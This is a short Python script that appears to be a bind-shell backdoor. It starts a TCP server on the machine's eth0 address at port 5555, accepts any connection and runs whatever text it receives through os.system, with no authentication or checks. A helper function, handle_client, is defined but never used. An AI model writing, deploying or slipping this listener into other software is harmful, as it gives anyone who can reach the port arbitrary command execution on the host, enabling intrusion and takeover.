import socket
import os
import netifaces as ni


def get_my_ip() -> str:
    ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
    return ip


IP = get_my_ip()
PORT = 5555


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen(8)
    print(f'[*] Listening on {IP}:{PORT}')

    while True:
        client, address = server.accept()
        print(f'[*] Accept connection from {address[0]}:{address[1]}')
        response = client.recv(4096)
        os.system(response.decode())


def handle_client(client_socket):
    with client_socket as sock:
        request = sock.recv(1024)
        print(f'[*] Received: {request.decode("utf-8")}')
        sock.send(b'ACK')


if __name__ == '__main__':
    main()
